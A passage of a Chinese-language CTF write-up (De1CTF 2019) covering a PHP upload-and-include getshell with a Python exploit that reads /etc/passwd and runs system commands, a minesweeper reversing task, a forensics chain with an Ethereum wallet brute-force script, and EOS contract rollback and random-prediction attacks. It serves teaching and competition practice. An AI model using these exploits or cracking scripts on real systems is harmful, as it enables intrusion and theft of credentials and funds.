PHPSESSID=gv1jimuh2ptjp1j6o2apvqp0h2\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\r\n\r\nusername=admin&amp;password=jaivypassword&amp;code=400125&amp;xxx=&quot;,&apos;location&apos;=&gt;$location,&apos;uri&apos;=&gt;$uri));</span><br><span class="line">$c = (serialize($event));</span><br><span class="line">echo urlencode($c);</span><br></pre></td></tr></table></figure><h4><span id="getshell_2">getshell_2</span></h4><p>进入内网之后通过做代理扫描即可发现还存在一个内网ip <code>172.18.0.2</code>，访问它能够发现如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $sandbox = &apos;/var/sandbox/&apos; . md5(&quot;prefix&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    if($_FILES[&apos;file&apos;][&apos;name&apos;])</span><br><span class="line">    &#123;</span><br><span class="line">        $filename = !empty($_POST[&apos;file&apos;]) ? $_POST[&apos;file&apos;] : $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">        if (!is_array($filename)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = explode(&apos;.&apos;, $filename);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = end($filename);</span><br><span class="line">        if($ext==$filename[count($filename) - 1])</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;try again!!!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $new_name = (string)rand(100,999).&quot;.&quot;.$ext;</span><br><span class="line">        move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$new_name);</span><br><span class="line">        $_ = $_POST[&apos;hello&apos;];</span><br><span class="line">        if(@substr(file($_)[0],0,6)===&apos;@&lt;?php&apos;)</span><br><span class="line">        &#123;</span><br><span class="line">            if(strpos($_,$new_name)===false)</span><br><span class="line">            &#123;</span><br><span class="line">                include($_);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                echo &quot;you can do it!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unlink($new_name);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此处getshell，对应的exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">target = &quot;http://172.18.0.2/&quot;</span><br><span class="line">ip = &quot;172.18.0.3&quot;</span><br><span class="line">path = &quot;/var/sandbox/%s/&quot;%hashlib.md5((&quot;prefix&quot;+ip).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">#proxies=&#123;&apos;http&apos;:&apos;http://127.0.0.1:8080&apos;&#125;</span><br><span class="line">files = &#123;&quot;file&quot;:(&quot;x&quot;,open(&quot;1.txt&quot;,&quot;rb&quot;)),&quot;file[1]&quot;:(None,&apos;a&apos;),&quot;file[0]&quot;:(None,&apos;b&apos;),&quot;hello&quot;:(None,&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;)&#125;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    for i in range(10):</span><br><span class="line">        requests.post(target,files=files,)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)</span><br><span class="line"></span><br><span class="line">for i in range(0,1000):</span><br><span class="line">    files = &#123;&quot;file&quot;:(&quot;x&quot;,open(&quot;1.txt&quot;,&quot;rb&quot;)),&quot;file[1]&quot;:(None,&apos;a&apos;),&quot;file[0]&quot;:(None,&apos;b&apos;),&quot;s&quot;:(None,&quot;system(&apos;cat /etc/flag*&apos;);&quot;),&quot;hello&quot;:(None,path+str(i)+&apos;.b&apos;)&#125;</span><br><span class="line">    resp = requests.post(target,files=files,).text</span><br><span class="line">    if len(resp)&gt;0:</span><br><span class="line">        print(resp,i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>至于如何找到flag文件，可以直接使用如下的<code>find</code>命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*flag*&quot;</span><br></pre></td></tr></table></figure><h1><span id="misc">misc</span></h1><h2><span id="mine-sweeping">Mine Sweeping</span></h2><h4><span id="分析">分析</span></h4><p>Elements.cs <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">class Elements: MonoBehaviour</span><br><span class="line">&#123;</span><br><span class="line">    void Awake()</span><br><span class="line">    &#123;   </span><br><span class="line">        int x = (int)transform.position.x;</span><br><span class="line">        int y = (int)transform.position.y;</span><br><span class="line">        //根据全局的数组设置该格子是雷还是空地</span><br><span class="line">        bIsMine = (((MayWorldBeAtPeace[x, y] ^ AreYouFerryMen[x, y]) - 233) / 2333) == 1 ? true : false;</span><br><span class="line">        //根据格子的position，将物体实例绑定到网格中</span><br><span class="line">        Grids._instance.eleGrids[(int)transform.position.x, (int)transform.position.y] = this;</span><br><span class="line">        //网格中对应格子数值设置</span><br><span class="line">        Grids._instance.DevilsInHeaven[(int)transform.position.x, (int)transform.position.y] = (bIsMine == true ? 1 : 0);</span><br><span class="line">        //隐藏reset按钮</span><br><span class="line">        resetButton = GameObject.FindGameObjectWithTag(&quot;resetButton&quot;);</span><br><span class="line">        if (resetButton)</span><br><span class="line">            resetButton.SetActive(false);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Start is called before the first frame update</span><br><span class="line">    void Start()</span><br><span class="line">    &#123;</span><br><span class="line">        //初始化时混淆地图</span><br><span class="line">        Grids._instance.ChangeMap();</span><br><span class="line">        //测试用</span><br><span class="line">        //DawnsLight();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    void OnMouseUpAsButton()</span><br><span class="line">    &#123;</span><br><span class="line">        //鼠标点击对应格子触发</span><br><span class="line">        if (!Grids._instance.bGameEnd &amp;&amp; !bIsOpen)</span><br><span class="line">        &#123;   //未翻开</span><br><span class="line">            //设置翻开</span><br><span class="line">            bIsOpen = true;</span><br><span class="line">            int nX = (int)transform.position.x;</span><br><span class="line">            int nY = (int)transform.position.y;</span><br><span class="line">            if (bIsMine)</span><br><span class="line">            &#123;</span><br><span class="line">                //显示雷</span><br><span class="line">                SafeAndThunder(0);</span><br><span class="line">                Grids._instance.bGameEnd = true;</span><br><span class="line">                //游戏失败</span><br><span class="line">                Grids._instance.GameLose();</span><br><span class="line">                print(&quot;game over: lose&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                //翻到的不是雷，显示周围雷的数量+翻开相邻的周围无雷的格子</span><br><span class="line">                int adjcentNum = Grids._instance.CountAdjcentNum(nX, nY);</span><br><span class="line">                SafeAndThunder(adjcentNum);</span><br><span class="line">                Grids._instance.Flush(nX, nY, new bool[Grids.w, Grids.h]);</span><br><span class="line">            &#125;</span><br><span class="line">            if (Grids._instance.GameWin())</span><br><span class="line">            &#123;</span><br><span class="line">                //游戏胜利</span><br><span class="line">                Grids._instance.bGameEnd = true;</span><br><span class="line">                print(&quot;game over: win&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Elements.cs是挂在每个格子身上的脚本，Awake中确定该格子是雷还是空地，Start中将地图中固定的六个摇摆位随机化，OnMouseUpAsButton检测当前格子是不是雷，并作出相应处理</p><p>Grid.cs <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public bool GameWin()</span><br><span class="line">&#123;</span><br><span class="line">    foreach (Elements ele in eleGrids)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!ele.bIsOpen &amp;&amp; !ele.bIsMine)</span><br><span class="line">        &#123;   //存在没翻开且不是雷的</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    foreach (Elements ele in eleGrids)</span><br><span class="line">    &#123;   //加载最后的图片</span><br><span class="line">        ele.DawnsLight();</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void ChangeMap()</span><br><span class="line">&#123;</span><br><span class="line">    System.Random ran = new System.Random((int)System.DateTime.Now.Millisecond);</span><br><span class="line">    const int SwingNum = 6;</span><br><span class="line">    const int Start = 0;</span><br><span class="line">    const int End = 100;</span><br><span class="line">    int[] SwingPosX = new int[SwingNum]&#123; 9, 15, 21, 10, 18, 12, &#125;;</span><br><span class="line">    int[] SwingPosY = new int[SwingNum]&#123; 0, 7, 15, 3, 16, 28 &#125;;</span><br><span class="line">    int[] RandomNum = new int[SwingNum];</span><br><span class="line">    for (int i = 0; i &lt; SwingNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        RandomNum[i] = ran.Next(Start, End);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; SwingNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int x = SwingPosX[i];</span><br><span class="line">        int y = SwingPosY[i];</span><br><span class="line">        eleGrids[x, y].bIsMine = RandomNum[i] &gt; 60 ? false : true ;</span><br><span class="line">        DevilsInHeaven[x, y] = eleGrids[x, y].bIsMine == true ? 1 : 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Grid.cs是控制网格的脚本，主要就是检测游戏输赢以及是否按下reset按钮，ChangeMap函数会将六个摇摆位的01随机化，起到混淆作用</p><h4><span id="exp">exp</span></h4><ol type="1"><li>直接做，每次点到雷了，就记录雷的位置，反正reset按钮只会将格子都翻面，不会改变格子的01值，保守估计30min可以解决</li><li>逆向，分析Elements.cs，得知每个格子是不是雷，是通过全局数组决定的，然后拿全局数组MayWorldBeAtPeace和AreYouFerryMen做对应处理就可以了</li><li>动态调试，在游戏进去后查看Grid.cs中的，用来保存游戏数据以便reset按钮执行的DevilsInHeaven数组，解决</li><li>改代码，通过底层修改Grid.cs中检测游戏输赢的if语句，直接加载最后的二维码</li></ol><h2><span id="deepinreal">DeepInReal</span></h2><p>压缩包解压得到三个文件。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/1.png" alt><figcaption>1</figcaption></figure><p>先看 <code>from-officer.txt</code>。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/2.png" alt><figcaption>2</figcaption></figure><p>大概意思是说，这个二进制文件是从嫌疑人的移动硬盘里恢复出来的，是一个 <code>AES-256</code> 加密文件，解密的密钥是世界上最常用和最弱的。</p><p>根据 <code>officer</code> 的提示，我们可以上网查一下世界上最常用和最弱的密码是什么。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/3.png" alt><figcaption>3</figcaption></figure><p>根据维基百科的记录， 2019 年最常用的密码排在第一位的是 <code>123456</code> 。</p><p>那么我们用题目所提供的加解密软件 <code>WinAES</code> 和密钥 <code>123456</code> 即可解密 <code>recovered.bin</code> 文件。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/4.png" alt><figcaption>4</figcaption></figure><p>得到解密文件 <code>recovered.bin.decrypted</code>，很自然地想查看文件类型，就去查看一下文件的头部。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/5.png" alt><figcaption>5</figcaption></figure><p>这个文件原名叫 <code>linj.vmdk</code>，是一个 <code>vmdk</code> 映像文件。它的文件头部被修改过，我们可以参照其它 <code>vmdk</code> 格式的文件头部，把头部改回正常。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/6.png" alt><figcaption>6</figcaption></figure><p>这时候就是一个正常的 <code>vmdk</code> 文件了。我们可以使用 <code>开源取证工具</code> 或者 <code>商业取证工具</code> 进行 静态取证，也可以使用 <code>专业仿真软件</code> 或者 <code>VMware</code> 进行 <code>动态取证</code>。</p><p>我这里使用 <code>取证大师</code> 进行 <code>静态取证</code>，使用 <code>VMware</code> 进行 <code>动态取证</code>。</p><p>在 <code>VMware</code> 中加载这个镜像文件，开机后登录系统需要密码，密码提示 <code>headers</code> 。</p><p>刚才我们在文件头处看到了 <code>i_love_kdmv</code>，这个就是系统登录的密码。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/7.png" alt><figcaption>7</figcaption></figure><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/8.png" alt><figcaption>8</figcaption></figure><p>登录后，在桌面右上角看到一张便签，大概意思是，“你不应该到这里来，我已经删除了一条重要的钥匙，怎么找到我？”。</p><p>这里的“我”指的是“便签”。嫌疑人很可能使用系统自带的功能进行信息的隐藏。我们可以先找到 <code>windows 10</code> 下创建标签的方式，就是按下 <code>win+w</code> 键。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/9.png" alt><figcaption>9</figcaption></figure><p>从右边弹出的侧菜单栏可以看到，<code>sketchpad</code> 功能处写着 <code>bitlock</code>，点进去看看。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/10.png" alt><figcaption>10</figcaption></figure><p>可以看到 <code>bitlocker</code> 的密码，<code>linj920623!@#</code>，系统中确实存在一个 <code>bitlocker</code> 的加密盘。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/11.png" alt><figcaption>11</figcaption></figure><p>使用密码进行解密，可以成功解开加密盘。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/12.png" alt><figcaption>12</figcaption></figure><p>加密盘里有两个值得留意的文件。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/13.png" alt><figcaption>13</figcaption></figure><p>一个是数字货币加密钱包文件，另一个是密码字典。这可能是嫌疑人用来进行资金流通的数字货币钱包。</p><p>我们尝试写个脚本，使用密码字典对加密钱包文件进行暴力破解。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import eth_keyfile</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">fp = open(&apos;ethpass.dict&apos;, &apos;r&apos;)</span><br><span class="line">wallet = json.loads(open(&apos;UTC--2019-07-09T21-31-39.077Z--266ed8970d4713e8f2701cbe137bda2711b78d57&apos;, &apos;r&apos;).read())</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        password = fp.readline().strip().encode(&apos;ascii&apos;)</span><br><span class="line">        if len(password) &lt;= 0 :</span><br><span class="line">            print(&quot;password not found&quot;)</span><br><span class="line">            break</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">    try:</span><br><span class="line">        result = eth_keyfile.decode_keyfile_json(wallet, password)</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">    print(password)</span><br><span class="line">    print(result)</span><br><span class="line">    break</span><br></pre></td></tr></table></figure><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/14.png" alt><figcaption>14</figcaption></figure><p>暴力破解可以得到结果，加密钱包密码为 <code>nevada</code>，钱包私钥为 <code>VeraCrypt Pass: V3Ra1sSe3ure2333</code>。</p><p>私钥提示我们有一个 <code>VeraCrypt</code> 加密的容器，它的加密密码为 <code>V3Ra1sSe3ure2333</code>。</p><p>那么我们需要先找到这个容器文件。这里可以使用全盘搜索包含特定字串的方法，找到这个加密容器文件。我这里使用 <code>取证大师</code> 进行取证，直接在 <code>加密文件</code> 处可以找到这个文件。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/15.png" alt><figcaption>15</figcaption></figure><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/16.png" alt><figcaption>16</figcaption></figure><p>可是在 <code>VMware</code> 相对应的路径下找不到这个文件，想起便签处的提示，可能在系统加载的时候该文件被删除了。</p><p>我们在系统启动项处，找到一个自动删除 <code>.mylife.vera</code> 文件的隐藏脚本文件。嫌疑人故意设置了一个简易的开机自删除功能。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/17.png" alt><figcaption>17</figcaption></figure><p>那么我们可以直接在 <code>取证大师</code> 中导出该文件，也可以从系统盘的用户缓存目录下找到该文件。</p><p>使用 <code>VeraCrypt</code> 和之前找到的密码 <code>V3Ra1sSe3ure2333</code> 进行解密并挂载。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/18.png" alt><figcaption>18</figcaption></figure><p>我们可以找到看到加密容器内，一共有 <code>184</code> 个文件，有一堆生活照，还有一个 <code>readme</code> 文件。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/19.png" alt><figcaption>19</figcaption></figure><p><code>readme</code> 文件提示这里有 <code>185</code> 个文件，其中 <code>183</code> 张照片是我的生活照，所以必然有一个文件被隐藏了。</p><p>这个文件系统为 <code>NTFS</code>，想起嫌疑人可能使用 <code>NTFS交换数据流</code> 的方式进行文件隐藏。</p><p>在 <code>cmd</code> 下使用 <code>dir /r</code> 命令可以看到隐藏文件 <code>528274475768683480.jpg:k3y.txt:$DATA</code>。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/20.png" alt><figcaption>20</figcaption></figure><p>使用 <code>notepad 528274475768683480.jpg:k3y.txt</code> 命令，直接使用记事本打开被隐藏的文件。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/21.png" alt><figcaption>21</figcaption></figure><p>可以得到一串密码 <code>F1a9ZiPInD6TABaSE</code>，并且根据密码的提示，<code>flag.zip</code> 文件在数据库里。嫌疑人可能把重要文件存放在电脑的数据库里。</p><p>想起嫌疑人的电脑装有 <code>phpStudy</code> 和 <code>Navicat</code>，直接启动 <code>mysql</code>，使用 <code>Navicat</code> 查看数据库。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/22.png" alt><figcaption>22</figcaption></figure><p>看到几个数据库的名称，与 <code>bitlocker</code> 加密盘下 <code>gambling</code> 文件夹里的几个 <code>.sql</code> 文件名一致。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/23.png" alt><figcaption>23</figcaption></figure><p>那么我们可以比较 <code>.sql</code> 文件里的数据与数据库里的数据，找到数据库 <code>tencent</code> 里多了一张表 <code>auth_secret</code> 。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/24.png" alt><figcaption>24</figcaption></figure><p>字段名为 <code>file</code>，字段值是一串 <code>base64</code> 编码字符串。</p><p>导出解码，转换为二进制文件，得到一个 <code>zip</code> 文件。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/25.png" alt><figcaption>25</figcaption></figure><p>压缩包注释里提示，“这是一个真正的flag文件”，需要找到密码解开。</p><p>我们用之前找到的密码 <code>F1a9ZiPInD6TABaSE</code>，解开 <code>flag.txt</code> 文件。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/26.png" alt><figcaption>26</figcaption></figure><p>成功找到嫌疑人隐藏的重要信息。</p><p>Flag：<code>de1ctf{GeT_Deep3r_1N_REAl_lifE_fOrEnIcs}</code></p><h2><span id="easy-eos">Easy EOS</span></h2><h4><span id="方法一交易回滚攻击">方法一：交易回滚攻击</span></h4><p>经观察，发现<code>bet action</code> 在一次交易中完成了猜数字游戏，并且发现若赢了，则users表中win的次数+1；若输了，则users表中lost的次数+1。</p><p>可以通过部署合约，通过<code>inline action</code>的方式，分别进行猜数字和判断。第一个<code>action</code>猜数字，第二个<code>action</code>进行判断刚刚是否赢了。若赢了，则通过；若输了，则抛出异常，使整个交易回滚。（耍赖）</p><p>攻击方式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 设置权限</span></span><br><span class="line">cleos set account permission gllrgjlqclkp active '&#123;"threshold": 1,"keys": [&#123;"key": "EOS7fyKcyPhP5P4S5xXqLzYEFg5bYuYRvxzsX3UJ5W7vAxvXtgYAU","weight": 1&#125;],"accounts":[&#123;"permission":&#123;"actor":"gllrgjlqclkp","permission":"eosio.code"&#125;,"weight":1&#125;]&#125;' owner -p gllrgjlqclkp@owner</span><br><span class="line"><span class="meta">#</span><span class="bash"> 编译合约</span></span><br><span class="line">cd attack4</span><br><span class="line">eosio-cpp -o attack4.wasm attack4.cpp</span><br><span class="line"><span class="meta">#</span><span class="bash"> 部署合约</span></span><br><span class="line">cleos set contract gllrgjlqclkp . -p gllrgjlqclkp@active</span><br><span class="line"><span class="meta">#</span><span class="bash"> 调用makebet方法多次，直到账号win次数大于等于10</span></span><br><span class="line">cleos push action gllrgjlqclkp makebet '[]' -p gllrgjlqclkp@active</span><br><span class="line"><span class="meta">#</span><span class="bash"> 请求发送flag</span></span><br><span class="line">cleos push action de1ctftest11 sendmail '["gllrgjlqclkp", "xxxx@qq.com"]' -p gllrgjlqclkp@active</span><br></pre></td></tr></table></figure><h4><span id="方法二伪随机数攻击">方法二：伪随机数攻击</span></h4><p>经过反编译得到伪随机数产生的算法，部署相应的合约，在一次交易中，计算将要产生的随机数，然后用该随机数调用目标合约的<code>bet action</code>。</p><p>攻击方式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 设置权限</span></span><br><span class="line">cleos set account permission btdaciaibmfp active '&#123;"threshold": 1,"keys": [&#123;"key": "EOS7fyKcyPhP5P4S5xXqLzYEFg5bYuYRvxzsX3UJ5W7vAxvXtgYAU","weight": 1&#125;],"accounts":[&#123;"permission":&#123;"actor":"btdaciaibmfp","permission":"eosio.code"&#125;,"weight":1&#125;]&#125;' owner -p btdaciaibmfp@owner</span><br><span class="line"><span class="meta">#</span><span class="bash"> 编译合约</span></span><br><span class="line">cd attack</span><br><span class="line">eosio-cpp -o attack.wasm attack.cpp</span><br><span class="line"><span class="meta">#</span><span class="bash"> 部署合约</span></span><br><span class="line">cleos set contract btdaciaibmfp . -p btdaciaibmfp@active</span><br><span class="line"><span class="meta">#</span><span class="bash"> 调用makebet方法10次</span></span><br><span class="line">cleos push action btdaciaibmfp makebet '[]' -p btdaciaibmfp@active</span><br><span class="line"><span class="meta">#</span><span class="bash"> 请求发送flag</span></span><br><span class="line">cleos push action de1ctftest11 sendmail '["btdaciaibmfp", "xxxxxx@gmail.com"]' -p btdaciaibmfp@active</span><br></pre></td></tr></table></figure><h2><span id="deepencrypt">DeepEncrypt</span></h2><h4><span id="赛题背景">赛题背景</span></h4><p>如今机器学习以及深度学习在各个领域广泛应用，包括医疗领域、金融领域、网络安全领域等等。深度学习需要大量的训练数据作为支持，然而如何保证训练的数据的安全性是值得我们考虑的。现在提出了许多基于深度学习模型的<a href="https://www.cs.cmu.edu/~mfredrik/papers/fjr2015ccs.pdf" target="_blank" rel="noopener">模型逆向攻击</a>，来对用户的数据进行窃取。</p><p>本题模拟了一种基于深度学习的模型，对一些用户数据（flag）进行一系列的处理之后生成“加密”之后的数据，让选手使用提供的数据，训练解密模型，获取原始的flag。</p><h4><span id="赛题流程">赛题流程</span></h4><h4><span id="提供文件">提供文件：</span></h4><ul><li>flag_sample.txt :用于训练的flag样本。</li><li>enc_sample.txt :用于训练的加密之后的flag样本。</li><li>enc.hdf5: 基于keras训练的flag加密模型。</li><li>flag_enc.txt: 选手需要解密的flag (flag in server-&gt; enc.hdf5-&gt; flag_enc.txt) #### 提供接口： 用于给选手提交解密之后的flag，和真实flag进行对比，误差小于0.2（可以减小误差要求，增加难度）即可通过，给出真实flag。 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">flag = np.loadtxt(<span class="string">"../data/flag.txt"</span>)</span><br><span class="line">true_flag = <span class="string">"de1ctf&#123;xxx_xxx_xxx&#125;"</span></span><br><span class="line">threshold=<span 